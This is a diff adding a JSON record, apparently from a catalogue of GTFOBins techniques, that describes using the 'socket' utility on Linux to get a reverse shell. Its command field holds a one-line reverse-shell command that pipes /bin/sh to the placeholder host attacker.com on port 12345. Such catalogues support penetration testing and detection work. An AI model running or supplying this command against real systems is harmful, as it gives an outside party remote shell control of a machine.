@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-socket-reverse-shell",
+  "name": "GTFOBins · socket (reverse-shell)",
+  "command": "socket -qvp '/bin/sh -i' attacker.com 12345",
+  "description": "Use socket to reverse shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "socket",
+    "reverse-shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/socket/#reverse-shell",
+  "upstream_id": "socket/reverse-shell/0",
+  "category": "gtfobins",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/socket/"
+    }
+  ]
+}
